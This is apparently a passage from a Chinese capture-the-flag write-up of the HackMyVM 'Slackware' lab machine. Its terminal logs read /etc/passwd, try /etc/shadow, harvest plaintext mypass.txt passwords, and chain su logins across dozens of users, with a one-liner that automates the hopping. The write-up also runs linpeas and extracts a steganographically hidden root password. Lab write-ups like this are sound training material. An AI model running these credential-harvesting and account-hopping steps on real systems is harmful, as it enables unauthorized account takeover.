patrick:x:1000:1000::/home/patrick:/bin/bash
kretinga:x:1001:1001::/home/kretinga:/bin/bash
claor:x:1002:1002::/home/claor:/bin/bash
alienum:x:1003:1003::/home/alienum:/bin/bash
mrmidnight:x:1004:1004::/home/mrmidnight:/bin/bash
annlynn:x:1005:1005::/home/annlynn:/bin/bash
powerful:x:1006:1006::/home/powerful:/bin/bash
proxy:x:1007:1007::/home/proxy:/bin/bash
x4v1l0k:x:1008:1008::/home/x4v1l0k:/bin/bash
icex64:x:1009:1009::/home/icex64:/bin/bash
mindsflee:x:1010:1010::/home/mindsflee:/bin/bash
zacarx007:x:1011:1011::/home/zacarx007:/bin/bash
terminal:x:1012:1012::/home/terminal:/bin/bash
zenmpi:x:1013:1013::/home/zenmpi:/bin/bash
sml:x:1014:1014::/home/sml:/bin/bash
emvee:x:1015:1015::/home/emvee:/bin/bash
nls:x:1016:1016::/home/nls:/bin/bash
noname:x:1017:1017::/home/noname:/bin/bash
nolose:x:1018:1018::/home/nolose:/bin/bash
sancelisso:x:1019:1019::/home/sancelisso:/bin/bash
ruycr4ft:x:1020:1020::/home/ruycr4ft:/bin/bash
tasiyanci:x:1021:1021::/home/tasiyanci:/bin/bash
lanz:x:1022:1022::/home/lanz:/bin/bash
pylon:x:1023:1023::/home/pylon:/bin/bash
wwfymn:x:1024:1024::/home/wwfymn:/bin/bash
whitecr0wz:x:1025:1025::/home/whitecr0wz:/bin/bash
bit:x:1026:1026::/home/bit:/bin/bash
infayerts:x:1027:1027::/home/infayerts:/bin/bash
rijaba1:x:1028:1028::/home/rijaba1:/bin/bash
cromiphi:x:1029:1029::/home/cromiphi:/bin/bash
gatogamer:x:1030:1030::/home/gatogamer:/bin/bash
ch4rm:x:1031:1031::/home/ch4rm:/bin/bash
aceomn:x:1032:1032::/home/aceomn:/bin/bash
kerszi:x:1033:1033::/home/kerszi:/bin/bash
d3b0o:x:1034:1034::/home/d3b0o:/bin/bash
avijneyam:x:1035:1035::/home/avijneyam:/bin/bash
zayotic:x:1036:1036::/home/zayotic:/bin/bash
kaian:x:1037:1037::/home/kaian:/bin/bash
c4rta:x:1038:1038::/home/c4rta:/bin/bash
boyras200:x:1039:1039::/home/boyras200:/bin/bash
waidroc:x:1040:1040::/home/waidroc:/bin/bash
ziyos:x:1041:1041::/home/ziyos:/bin/bash
b4el7d:x:1042:1042::/home/b4el7d:/bin/bash
rpj7:x:1043:1043::/home/rpj7:/bin/bash
h1dr0:x:1044:1044::/home/h1dr0:/bin/bash
catch_me75:x:1045:1045::/home/catch_me75:/bin/bash
josemlwdf:x:1046:1046::/home/josemlwdf:/bin/bash
skinny:x:1047:1047::/home/skinny:/bin/bash
0xeex75:x:1048:1048::/home/0xeex75:/bin/bash
0xh3rshel:x:1049:1049::/home/0xh3rshel:/bin/bash
0xjin:x:1050:1050::/home/0xjin:/bin/bash
(remote) patrick@slackware.slackware.local:/home$ cat /etc/shadow
cat: /etc/shadow: Permission denied
(remote) patrick@slackware.slackware.local:/home$ cd patrick/
(remote) patrick@slackware.slackware.local:/home/patrick$ ls -la
total 9
drwx--x--x  3 patrick users    136 Apr 25 09:43 ./
drwxr-xr-x 54 root    root    1400 Mar 10 22:16 ../
-rw-------  1 patrick patrick    5 Apr 25 09:43 .bash_history
drwx------  2 patrick patrick   48 Apr 25 09:45 .cache/
-rw-r--r--  1 patrick users   3729 Feb  2  2022 .screenrc
(remote) patrick@slackware.slackware.local:/home/patrick$ cd .bash_history 
-bash: cd: .bash_history: Not a directory
(remote) patrick@slackware.slackware.local:/home/patrick$ cat .bash_history 
exit
(remote) patrick@slackware.slackware.local:/home/patrick$ cd .cache/
(remote) patrick@slackware.slackware.local:/home/patrick/.cache$ ls -la
total 0
drwx------ 2 patrick patrick  48 Apr 25 09:45 ./
drwx--x--x 3 patrick users   136 Apr 25 09:43 ../
```

### 切换用户

```bash
(remote) patrick@slackware.slackware.local:/home$ cat /home/claor/mypass.txt
JRksNe5rWgis
(remote) patrick@slackware.slackware.local:/home$ cat /home/kretinga/mypass.txt
lpV8UG0GxKuw
(remote) patrick@slackware.slackware.local:/home$ find ./ -name *pass* -type f 2>/dev/null
./claor/mypass.txt
./kretinga/mypass.txt
(remote) patrick@slackware.slackware.local:/home$ su claor
Password: 
(remote) claor@slackware.slackware.local:/home$ find ./ -name *pass* -type f 2>/dev/null
./claor/mypass.txt
./mrmidnight/mypass.txt
./alienum/mypass.txt

(remote) claor@slackware.slackware.local:/home$ find ./ -name '*pass*' -type f 2>/dev/null | xargs cat
JRksNe5rWgis
B4ReHPEhmlPt
ex0XVRAAjCWX
(remote) claor@slackware.slackware.local:/home$ su mrmidnight
Password: 
(remote) mrmidnight@slackware.slackware.local:/home$ find ./ -name *pass* -type f 2>/dev/null
./powerful/mypass.txt
./mrmidnight/mypass.txt
./annlynn/mypass.txt
(remote) mrmidnight@slackware.slackware.local:/home$ find ./ -name '*pass*' -type f 2>/dev/null | xargs cat
pof2XIpVzYl3
B4ReHPEhmlPt
S64IamSERUI3
(remote) mrmidnight@slackware.slackware.local:/home$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

For security reasons, the password you type will not be visible.

Password: 
Sorry, user mrmidnight may not run sudo on slackware.
```

太多了，尝试上传`linpeas.sh`

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404252256378.png" alt="image-20240425180707479" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404252256379.png" alt="image-20240425180718659" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404252256380.png" alt="image-20240425180732585" style="zoom:50%;" />

```apl
/etc/ImageMagick-7/mime.xml
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404252256381.png" alt="image-20240425180835639" style="zoom:67%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404252256382.png" alt="image-20240425180927987" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404252256383.png" alt="image-20240425181149249" style="zoom: 50%;" />

群里的师傅套娃套出来了！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404252256384.png" alt="image-20240425181319562" style="zoom:50%;" />

```bash
(remote) rpj7@slackware.slackware.local:/home/rpj7$ ls -la
total 13
drwxr-x---  2 rpj7 b4el7d  136 Mar 11 12:47 .
drwxr-xr-x 54 root root   1400 Mar 10 22:16 ..
-rw-r--r--  1 rpj7 rpj7   3729 Feb  2  2022 .screenrc
-rw-r-----  1 rpj7 b4el7d   13 Mar 10 22:15 mypass.txt
-rw-r--r--  1 rpj7 b4el7d  314 Mar 11 13:29 user.txt
(remote) rpj7@slackware.slackware.local:/home/rpj7$ cat user.txt 
HMV{Th1s1s1Us3rFlag}                                                           
(remote) rpj7@slackware.slackware.local:/home/rpj7$ 
```

都没有收获，后来群主发现和`user.txt`有关系：

```bash
┌──(kali💀kali)-[~/temp/slakeware]
└─$ cat user.txt 
HMV{Th1s1s1Us3rFlag}                                                          
                                                                              
                                                                    
                                                                         
                                                                        
                                                                 
                         
                                                                        
┌──(kali💀kali)-[~/temp/slakeware]
└─$ file user.txt 
user.txt: ASCII text
                                                                        
┌──(kali💀kali)-[~/temp/slakeware]
└─$ stegsnow -C user.txt 
To_Jest_Bardzo_Trudne_Haslo
```

是一个隐写。。。。。

```bash
(remote) root@slackware.slackware.local:/root# ls -la
total 5
drwx--x---  6 root root 232 Mar 11 13:38 .
drwxr-xr-x 23 root root 536 Mar 10 16:29 ..
lrwxrwxrwx  1 root root   9 Mar 10 18:42 .bash_history -> /dev/null
drwx------  3 root root  72 Mar 11 15:14 .cache
drwx------  3 root root  72 Feb 16 22:12 .config
drwx------  2 root root 136 Feb 16 22:13 .gnupg
lrwxrwxrwx  1 root root   9 Mar 11 12:44 .lesshst -> /dev/null
drwx------  3 root root  72 Feb 16 22:12 .local
-r--------  1 root root  72 Mar 11 13:38 roo00oot.txt
(remote) root@slackware.slackware.local:/root# cat roo00oot.txt 
There is no root flag here, but it is somewhere in the /home directory.
(remote) root@slackware.slackware.local:/root# cd /home
(remote) root@slackware.slackware.local:/home# find ./ -name roo00oot.txt -type f 2>/dev/null
(remote) root@slackware.slackware.local:/home# ls
0xeex75    boyras200   gatogamer  mindsflee   rijaba1     whitecr0wz
0xh3rshel  c4rta       h1dr0      mrmidnight  rpj7        wwfymn
0xjin      catch_me75  icex64     nls         ruycr4ft    x4v1l0k
aceomn     ch4rm       infayerts  nolose      sancelisso  zacarx007
alienum    claor       josemlwdf  noname      skinny      zayotic
annlynn    cromiphi    kaian      patrick     sml         zenmpi
avijneyam  d3b0o       kerszi     powerful    tasiyanci   ziyos
b4el7d     emvee       kretinga   proxy       terminal
bit        ftp         lanz       pylon       waidroc
(remote) root@slackware.slackware.local:/home# cd 0xeex75/
(remote) root@slackware.slackware.local:/home/0xeex75# ls -la
total 5
drwxr-x---  2 0xeex75 0xeex75   80 Mar 10 22:15 .
drwxr-xr-x 54 root    root    1400 Mar 10 22:16 ..
-rw-r--r--  1 0xeex75 0xeex75 3729 Feb  2  2022 .screenrc
(remote) root@slackware.slackware.local:/home/0xeex75# find ./ -name *oo*.txt -type f 2>/dev/null
(remote) root@slackware.slackware.local:/home/0xeex75# find ./ -name *oo -type f 2>/dev/null
(remote) root@slackware.slackware.local:/home/0xeex75# cd ..
(remote) root@slackware.slackware.local:/home# find ./ -name *oo*.txt -type f 2>/dev/null
(remote) root@slackware.slackware.local:/home# find ./ -name *oo -type f 2>/dev/null
(remote) root@slackware.slackware.local:/home# cd kerszi/
(remote) root@slackware.slackware.local:/home/kerszi# ls -la
total 9
drwxr-x---  2 kerszi aceomn  112 Mar 10 22:15 .
drwxr-xr-x 54 root   root   1400 Mar 10 22:16 ..
-rw-r--r--  1 kerszi kerszi 3729 Feb  2  2022 .screenrc
-rw-r-----  1 kerszi aceomn   13 Mar 10 22:15 mypass.txt
(remote) root@slackware.slackware.local:/home/kerszi# cd ..
(remote) root@slackware.slackware.local:/home# find ./ -name *.txt -type f 2>/dev/null
./bit/mypass.txt
./nls/mypass.txt
./sml/mypass.txt
./lanz/mypass.txt
./rpj7/mypass.txt
./rpj7/user.txt
./sancelisso/mypass.txt
./c4rta/mypass.txt
./d3b0o/mypass.txt
./gatogamer/mypass.txt
./ch4rm/mypass.txt
./h1dr0/mypass.txt
./claor/mypass.txt
./emvee/mypass.txt
./kaian/mypass.txt
./rijaba1/mypass.txt
./proxy/mypass.txt
./pylon/mypass.txt
./ziyos/mypass.txt
./zayotic/mypass.txt
./mindsflee/mypass.txt
./x4v1l0k/mypass.txt
./terminal/mypass.txt
./b4el7d/mypass.txt
./zacarx007/mypass.txt
./boyras200/mypass.txt
./tasiyanci/mypass.txt
./aceomn/mypass.txt
./powerful/mypass.txt
./mrmidnight/mypass.txt
./whitecr0wz/mypass.txt
./icex64/mypass.txt
./kerszi/mypass.txt
./ruycr4ft/mypass.txt
./kretinga/mypass.txt
./nolose/mypass.txt
./noname/mypass.txt
./skinny/mypass.txt
./catch_me75/mypass.txt
./avijneyam/mypass.txt
./alienum/mypass.txt
./wwfymn/mypass.txt
./annlynn/mypass.txt
./zenmpi/mypass.txt
./waidroc/mypass.txt
./infayerts/mypass.txt
./josemlwdf/mypass.txt
./cromiphi/mypass.txt
(remote) root@slackware.slackware.local:/home# find ./ -name *.txt -type f 2>/dev/null | xargs cat
fDZRz4SJOs8z
VfS9EIU5C9xw
AQewY20VryO7
IBrVGveXM3jI
wP26CtkDby6J
HMV{Th1s1s1Us3rFlag}                                                          
                                                                              
                                                                    
                                                                         
                                                                        
                                                                 
                         
oAGSK1zXcbT8
IAuaOSSTZHoh
oHjylQ7402Dd
yjwGMry82S2Y
Hz35MslshyXj
tnvAny2zwYTV
JRksNe5rWgis
sj5mu74Nmowb
R23AJFVTQYaB
eaqz8vJ2pRmU
GX2xnNNU2Hcc
6Mqoo8Pud4Fx
8eS8I1JGxeeZ
bgg9TT9otdD6
VZFoxk0lqnnc
TB7pVPwPUeIW
Qv0dtvZdfpvN
llMttpVCiYPw
8LCa5IDAELR4
oW19TzLywNIq
JO8dvF60MdXR
sXdnu8wF1Yb8
pof2XIpVzYl3
B4ReHPEhmlPt
51BwJ9iYO4E7
tX5o7AUg2PTd
rjDwcHDFYBML
G5UJEpW78pOV
lpV8UG0GxKuw
KcHXtRsiUPpw
0Vsok2PoVo7t
iJ7EnTBCtUS8
Vkyo6rKvXsIw
vRdS8PLTnTlW
ex0XVRAAjCWX
VBebiyG62uIg
S64IamSERUI3
WiEbQP6K4Sg9
0aApTUf5E2Eq
NYURcD5V8k4X
jLzXNEEFdtLX
CQBpV2NQ3U6A
(remote) root@slackware.slackware.local:/home# find .|xargs grep -ri "hmv" 
./rpj7/user.txt:HMV{Th1s1s1Us3rFlag}                                                           
./0xh3rshel/.screenrc:# Here is a flag for root: HMV{SlackwareStillAlive}
./rpj7/user.txt:HMV{Th1s1s1Us3rFlag}                                                           
./rpj7/user.txt:HMV{Th1s1s1Us3rFlag}                                                           
grep: ./mrmidnight/.gnupg/S.gpg-agent.ssh: No such device or address
grep: ./mrmidnight/.gnupg/S.gpg-agent.extra: No such device or address
grep: ./mrmidnight/.gnupg/S.gpg-agent: No such device or address
grep: ./mrmidnight/.gnupg/S.gpg-agent.browser: No such device or address./0xh3rshel/.screenrc:# Here is a flag for root: HMV{SlackwareStillAlive}
./0xh3rshel/.screenrc:# Here is a flag for root: HMV{SlackwareStillAlive}
```

。。。。。汗流浃背了。。。。

## 额外收获

[群主](https://hackmyvm.eu/profile/?user=ll104567)的数据处理方法：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404261337894.png" alt="image-20240426130104342" style="zoom:50%;" />

实践一下：

```bash
patrick@slackware:~$ id
uid=1000(patrick) gid=1000(patrick) groups=1000(patrick),1001(kretinga)
patrick@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}')
patrick@slackware:~$ echo $user
kretinga
patrick@slackware:~$ pass=$(cat ../$user/mypass.txt)
patrick@slackware:~$ echo $pass
lpV8UG0GxKuw
patrick@slackware:~$ grep -Pnir 'hmv' /home 2>/dev/null
patrick@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
lpV8UG0GxKuw
Password: 
kretinga@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
JRksNe5rWgis
Password: 
claor@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
ex0XVRAAjCWX
Password: 
alienum@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
B4ReHPEhmlPt
Password: 
mrmidnight@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
S64IamSERUI3
Password: 
annlynn@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
pof2XIpVzYl3
Password: 
powerful@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
GX2xnNNU2Hcc
Password: 
proxy@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
TB7pVPwPUeIW
Password: 
x4v1l0k@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
tX5o7AUg2PTd
Password: 
icex64@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
VZFoxk0lqnnc
Password: 
mindsflee@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
8LCa5IDAELR4
Password: 
zacarx007@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
Qv0dtvZdfpvN
Password: 
terminal@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
WiEbQP6K4Sg9
Password: 
zenmpi@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
AQewY20VryO7
Password: 
sml@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
sj5mu74Nmowb
Password: 
emvee@slackware:~$  user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
VfS9EIU5C9xw
Password: 
nls@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
0Vsok2PoVo7t
Password: 
noname@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
KcHXtRsiUPpw
Password: 
nolose@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
oAGSK1zXcbT8
Password: 
sancelisso@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
G5UJEpW78pOV
Password: 
ruycr4ft@slackware:~$  user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
JO8dvF60MdXR
Password: 
tasiyanci@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
IBrVGveXM3jI
Password: 
lanz@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
6Mqoo8Pud4Fx
Password: 
pylon@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
VBebiyG62uIg
Password: 
wwfymn@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
51BwJ9iYO4E7
Password: 
whitecr0wz@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
fDZRz4SJOs8z
Password: 
bit@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
NYURcD5V8k4X
Password: 
infayerts@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
eaqz8vJ2pRmU
Password: 
rijaba1@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
CQBpV2NQ3U6A
Password: 
cromiphi@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
yjwGMry82S2Y
Password: 
gatogamer@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
Hz35MslshyXj
Password: 
ch4rm@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
sXdnu8wF1Yb8
Password: 
aceomn@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
rjDwcHDFYBML
Password: 
kerszi@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
oHjylQ7402Dd
Password: 
d3b0o@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
vRdS8PLTnTlW
Password: 
avijneyam@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
bgg9TT9otdD6
Password: 
zayotic@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
R23AJFVTQYaB
Password: 
kaian@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
IAuaOSSTZHoh
Password: 
c4rta@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
oW19TzLywNIq
Password: 
boyras200@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
0aApTUf5E2Eq
Password: 
waidroc@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
8eS8I1JGxeeZ
Password: 
ziyos@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
llMttpVCiYPw
Password: 
b4el7d@slackware:~$ user=$(id|awk -F'[()]' '{print $(NF-1)}');pass=$(cat ../$user/mypass.txt);echo $pass;su - $user
wP26CtkDby6J
Password: 
rpj7@slackware:~$ grep -Pnir 'hmv' /home 2>/dev/null
/home/rpj7/.bash_history:7:grep -Pnir 'hmv' /home
/home/rpj7/user.txt:1:HMV{Th1s1s1Us3rFlag}
```

我这里是知道结果了，实际上每一步都要查一下。。。。
